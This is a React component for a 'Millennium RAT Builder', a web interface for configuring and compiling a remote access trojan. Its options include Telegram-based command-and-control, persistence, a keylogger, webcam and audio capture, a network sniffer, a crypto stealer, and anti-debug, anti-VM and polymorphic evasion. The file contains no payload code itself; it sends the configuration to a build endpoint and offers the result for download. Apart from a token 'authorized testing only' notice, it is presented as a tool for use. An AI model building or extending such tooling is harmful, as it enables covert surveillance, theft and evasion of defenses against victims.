
import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Switch } from "@/components/ui/switch";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Badge } from "@/components/ui/badge";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { useToast } from "@/hooks/use-toast";
import { 
  Wrench, 
  Download, 
  Shield, 
  Zap, 
  Eye,
  Key,
  Network,
  FileCode,
  AlertTriangle,
  CheckCircle,
  Loader2
} from "lucide-react";

interface RATConfig {
  serverIp: string;
  serverPort: string;
  outputName: string;
  telegramToken: string;
  chatId: string;
  persistence: boolean;
  keylogger: boolean;
  stealth: boolean;
  crypter: {
    enabled: boolean;
    antiDebug: boolean;
    antiVM: boolean;
    compression: boolean;
    polymorphic: boolean;
  };
  modules: {
    screenshot: boolean;
    webcam: boolean;
    audio: boolean;
    fileManager: boolean;
    networkSniffer: boolean;
    cryptoStealer: boolean;
  };
}

export default function MillenniumBuilder() {
  const { toast } = useToast();
  const [config, setConfig] = useState<RATConfig>({
    serverIp: "0.0.0.0",
    serverPort: "8888",
    outputName: "millennium_agent",
    telegramToken: "",
    chatId: "",
    persistence: true,
    keylogger: true,
    stealth: true,
    crypter: {
      enabled: true,
      antiDebug: true,
      antiVM: true,
      compression: true,
      polymorphic: false
    },
    modules: {
      screenshot: true,
      webcam: true,
      audio: true,
      fileManager: true,
      networkSniffer: true,
      cryptoStealer: false
    }
  });
  
  const [isCompiling, setIsCompiling] = useState(false);
  const [buildResult, setBuildResult] = useState<any>(null);

  const handleCompile = async () => {
    setIsCompiling(true);
    try {
      const response = await fetch('/api/build-rat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ config })
      });

      if (!response.ok) throw new Error('Compilation failed');
      
      const result = await response.json();
      setBuildResult(result);
      
      toast({
        title: "RAT Compiled Successfully",
        description: `${config.outputName} is ready for download`,
      });
    } catch (error) {
      toast({
        title: "Compilation Failed",
        description: error instanceof Error ? error.message : "Unknown error",
        variant: "destructive"
      });
    } finally {
      setIsCompiling(false);
    }
  };

  const handleDownload = () => {
    if (buildResult?.downloadUrl) {
      window.open(buildResult.downloadUrl, '_blank');
    }
  };

  return (
    <div className="space-y-6">
      <Card className="border-green-800 bg-green-950/20">
        <CardHeader>
          <CardTitle className="flex items-center gap-2 text-green-400">
            <Wrench className="h-5 w-5" />
            Millennium RAT Builder
            <Badge variant="secondary" className="ml-auto bg-green-900 text-green-200">
              Professional Edition
            </Badge>
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-6">
          <Alert className="border-red-600 bg-red-950/20">
            <AlertTriangle className="h-4 w-4 text-red-400" />
            <AlertDescription className="text-red-400">
              This tool creates advanced remote access tools for authorized testing only. 
              Ensure you have proper authorization before deployment.
            </AlertDescription>
          </Alert>

          <Tabs defaultValue="server" className="w-full">
            <TabsList className="grid w-full grid-cols-4">
              <TabsTrigger value="server">Server Config</TabsTrigger>
              <TabsTrigger value="modules">Modules</TabsTrigger>
              <TabsTrigger value="protection">Protection</TabsTrigger>
              <TabsTrigger value="build">Build</TabsTrigger>
            </TabsList>

            <TabsContent value="server" className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="serverIp" className="text-green-400">Server IP</Label>
                  <Input
                    id="serverIp"
                    value={config.serverIp}
                    onChange={(e) => setConfig(prev => ({ ...prev, serverIp: e.target.value }))}
                    className="bg-black border-green-500 text-green-400"
                    placeholder="0.0.0.0"
                  />
                </div>

                <div>
                  <Label htmlFor="serverPort" className="text-green-400">Server Port</Label>
                  <Input
                    id="serverPort"
                    value={config.serverPort}
                    onChange={(e) => setConfig(prev => ({ ...prev, serverPort: e.target.value }))}
                    className="bg-black border-green-500 text-green-400"
                    placeholder="8888"
                  />
                </div>

                <div>
                  <Label htmlFor="outputName" className="text-green-400">Output Name</Label>
                  <Input
                    id="outputName"
                    value={config.outputName}
                    onChange={(e) => setConfig(prev => ({ ...prev, outputName: e.target.value }))}
                    className="bg-black border-green-500 text-green-400"
                    placeholder="millennium_agent"
                  />
                </div>

                <div>
                  <Label htmlFor="telegramToken" className="text-green-400">Telegram Bot Token</Label>
                  <Input
                    id="telegramToken"
                    type="password"
                    value={config.telegramToken}
                    onChange={(e) => setConfig(prev => ({ ...prev, telegramToken: e.target.value }))}
                    className="bg-black border-green-500 text-green-400"
                    placeholder="Bot token for C2 notifications"
                  />
                </div>

                <div className="md:col-span-2">
                  <Label htmlFor="chatId" className="text-green-400">Telegram Chat ID</Label>
                  <Input
                    id="chatId"
                    value={config.chatId}
                    onChange={(e) => setConfig(prev => ({ ...prev, chatId: e.target.value }))}
                    className="bg-black border-green-500 text-green-400"
                    placeholder="Chat ID for notifications"
                  />
                </div>
              </div>

              <div className="space-y-4">
                <h3 className="text-sm font-semibold text-green-400">Core Features</h3>
                
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div className="flex items-center justify-between">
                    <Label htmlFor="persistence" className="text-green-400">Persistence</Label>
                    <Switch
                      id="persistence"
                      checked={config.persistence}
                      onCheckedChange={(checked) => 
                        setConfig(prev => ({ ...prev, persistence: checked }))
                      }
                    />
                  </div>

                  <div className="flex items-center justify-between">
                    <Label htmlFor="keylogger" className="text-green-400">Keylogger</Label>
                    <Switch
                      id="keylogger"
                      checked={config.keylogger}
                      onCheckedChange={(checked) => 
                        setConfig(prev => ({ ...prev, keylogger: checked }))
                      }
                    />
                  </div>

                  <div className="flex items-center justify-between">
                    <Label htmlFor="stealth" className="text-green-400">Stealth Mode</Label>
                    <Switch
                      id="stealth"
                      checked={config.stealth}
                      onCheckedChange={(checked) => 
                        setConfig(prev => ({ ...prev, stealth: checked }))
                      }
                    />
                  </div>
                </div>
              </div>
            </TabsContent>

            <TabsContent value="modules" className="space-y-4">
              <h3 className="text-lg font-semibold text-green-400">RAT Modules</h3>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="flex items-center justify-between p-3 border border-green-700 rounded-lg">
                  <div className="flex items-center gap-2">
                    <Eye className="h-4 w-4 text-green-400" />
                    <Label htmlFor="screenshot" className="text-green-400">Screenshot Capture</Label>
                  </div>
                  <Switch
                    id="screenshot"
                    checked={config.modules.screenshot}
                    onCheckedChange={(checked) => 
                      setConfig(prev => ({ 
                        ...prev, 
                        modules: { ...prev.modules, screenshot: checked }
                      }))
                    }
                  />
                </div>

                <div className="flex items-center justify-between p-3 border border-green-700 rounded-lg">
                  <div className="flex items-center gap-2">
                    <Eye className="h-4 w-4 text-green-400" />
                    <Label htmlFor="webcam" className="text-green-400">Webcam Access</Label>
                  </div>
                  <Switch
                    id="webcam"
                    checked={config.modules.webcam}
                    onCheckedChange={(checked) => 
                      setConfig(prev => ({ 
                        ...prev, 
                        modules: { ...prev.modules, webcam: checked }
                      }))
                    }
                  />
                </div>

                <div className="flex items-center justify-between p-3 border border-green-700 rounded-lg">
                  <div className="flex items-center gap-2">
                    <Zap className="h-4 w-4 text-green-400" />
                    <Label htmlFor="audio" className="text-green-400">Audio Recording</Label>
                  </div>
                  <Switch
                    id="audio"
                    checked={config.modules.audio}
                    onCheckedChange={(checked) => 
                      setConfig(prev => ({ 
                        ...prev, 
                        modules: { ...prev.modules, audio: checked }
                      }))
                    }
                  />
                </div>

                <div className="flex items-center justify-between p-3 border border-green-700 rounded-lg">
                  <div className="flex items-center gap-2">
                    <FileCode className="h-4 w-4 text-green-400" />
                    <Label htmlFor="fileManager" className="text-green-400">File Manager</Label>
                  </div>
                  <Switch
                    id="fileManager"
                    checked={config.modules.fileManager}
                    onCheckedChange={(checked) => 
                      setConfig(prev => ({ 
                        ...prev, 
                        modules: { ...prev.modules, fileManager: checked }
                      }))
                    }
                  />
                </div>

                <div className="flex items-center justify-between p-3 border border-green-700 rounded-lg">
                  <div className="flex items-center gap-2">
                    <Network className="h-4 w-4 text-green-400" />
                    <Label htmlFor="networkSniffer" className="text-green-400">Network Sniffer</Label>
                  </div>
                  <Switch
                    id="networkSniffer"
                    checked={config.modules.networkSniffer}
                    onCheckedChange={(checked) => 
                      setConfig(prev => ({ 
                        ...prev, 
                        modules: { ...prev.modules, networkSniffer: checked }
                      }))
                    }
                  />
                </div>

                <div className="flex items-center justify-between p-3 border border-yellow-700 rounded-lg">
                  <div className="flex items-center gap-2">
                    <Key className="h-4 w-4 text-yellow-400" />
                    <Label htmlFor="cryptoStealer" className="text-yellow-400">Crypto Stealer</Label>
                  </div>
                  <Switch
                    id="cryptoStealer"
                    checked={config.modules.cryptoStealer}
                    onCheckedChange={(checked) => 
                      setConfig(prev => ({ 
                        ...prev, 
                        modules: { ...prev.modules, cryptoStealer: checked }
                      }))
                    }
                  />
                </div>
              </div>
            </TabsContent>

            <TabsContent value="protection" className="space-y-4">
              <h3 className="text-lg font-semibold text-green-400">Protection & Evasion</h3>
              
              <div className="space-y-4">
                <div className="flex items-center justify-between">
                  <Label htmlFor="crypterEnabled" className="text-green-400 flex items-center gap-2">
                    <Shield className="w-4 h-4" />
                    Enable Advanced Crypter
                  </Label>
                  <Switch
                    id="crypterEnabled"
                    checked={config.crypter.enabled}
                    onCheckedChange={(checked) => 
                      setConfig(prev => ({ 
                        ...prev, 
                        crypter: { ...prev.crypter, enabled: checked }
                      }))
                    }
                  />
                </div>

                {config.crypter.enabled && (
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4 p-4 border border-green-700 rounded-lg">
                    <div className="flex items-center justify-between">
                      <Label htmlFor="antiDebug" className="text-green-400">Anti-Debug</Label>
                      <Switch
                        id="antiDebug"
                        checked={config.crypter.antiDebug}
                        onCheckedChange={(checked) => 
                          setConfig(prev => ({ 
                            ...prev, 
                            crypter: { ...prev.crypter, antiDebug: checked }
                          }))
                        }
                      />
                    </div>

                    <div className="flex items-center justify-between">
                      <Label htmlFor="antiVM" className="text-green-400">Anti-VM</Label>
                      <Switch
                        id="antiVM"
                        checked={config.crypter.antiVM}
                        onCheckedChange={(checked) => 
                          setConfig(prev => ({ 
                            ...prev, 
                            crypter: { ...prev.crypter, antiVM: checked }
                          }))
                        }
                      />
                    </div>

                    <div className="flex items-center justify-between">
                      <Label htmlFor="compression" className="text-green-400">Compression</Label>
                      <Switch
                        id="compression"
                        checked={config.crypter.compression}
                        onCheckedChange={(checked) => 
                          setConfig(prev => ({ 
                            ...prev, 
                            crypter: { ...prev.crypter, compression: checked }
                          }))
                        }
                      />
                    </div>

                    <div className="flex items-center justify-between">
                      <Label htmlFor="polymorphic" className="text-green-400">Polymorphic</Label>
                      <Switch
                        id="polymorphic"
                        checked={config.crypter.polymorphic}
                        onCheckedChange={(checked) => 
                          setConfig(prev => ({ 
                            ...prev, 
                            crypter: { ...prev.crypter, polymorphic: checked }
                          }))
                        }
                      />
                    </div>
                  </div>
                )}
              </div>
            </TabsContent>

            <TabsContent value="build" className="space-y-4">
              <div className="space-y-4">
                <div className="flex items-center justify-between">
                  <h3 className="text-lg font-semibold text-green-400">Build Configuration</h3>
                  <div className="flex items-center gap-2">
                    <div className={`w-3 h-3 rounded-full ${
                      isCompiling ? 'bg-yellow-500 animate-pulse' : 
                      buildResult?.success ? 'bg-green-500' : 'bg-gray-500'
                    }`} />
                    <span className="text-sm">
                      {isCompiling ? 'Building...' : 
                       buildResult?.success ? 'Ready' : 'Not Built'}
                    </span>
                  </div>
                </div>

                {buildResult?.success && (
                  <Alert className="border-green-600 bg-green-950/20">
                    <CheckCircle className="h-4 w-4 text-green-400" />
                    <AlertDescription className="text-green-400">
                      RAT built successfully with the following features:
                      <ul className="mt-2 space-y-1">
                        {buildResult.features?.map((feature: string, index: number) => (
                          <li key={index} className="text-xs">• {feature}</li>
                        ))}
                      </ul>
                    </AlertDescription>
                  </Alert>
                )}

                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <Card className="bg-background/50">
                    <CardContent className="p-4">
                      <div className="text-sm font-medium text-blue-400">
                        Enabled Modules
                      </div>
                      <div className="text-xs text-muted-foreground">
                        {Object.entries(config.modules).filter(([_, enabled]) => enabled).length} / {Object.keys(config.modules).length}
                      </div>
                    </CardContent>
                  </Card>

                  <Card className="bg-background/50">
                    <CardContent className="p-4">
                      <div className="text-sm font-medium text-green-400">
                        Protection Level
                      </div>
                      <div className="text-xs text-muted-foreground">
                        {config.crypter.enabled ? 'Advanced' : 'Basic'}
                      </div>
                    </CardContent>
                  </Card>

                  <Card className="bg-background/50">
                    <CardContent className="p-4">
                      <div className="text-sm font-medium text-purple-400">
                        Output
                      </div>
                      <div className="text-xs text-muted-foreground">
                        {config.outputName}.py
                      </div>
                    </CardContent>
                  </Card>
                </div>

                <div className="flex gap-4">
                  <Button 
                    onClick={handleCompile} 
                    disabled={isCompiling}
                    className="flex-1 bg-green-600 hover:bg-green-700"
                  >
                    {isCompiling ? (
                      <>
                        <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                        Building RAT...
                      </>
                    ) : (
                      <>
                        <Wrench className="w-4 h-4 mr-2" />
                        Build Millennium RAT
                      </>
                    )}
                  </Button>

                  {buildResult?.success && (
                    <Button 
                      onClick={handleDownload}
                      variant="outline"
                      className="border-green-600 text-green-400 hover:bg-green-950"
                    >
                      <Download className="w-4 h-4 mr-2" />
                      Download
                    </Button>
                  )}
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </CardContent>
      </Card>
    </div>
  );
}
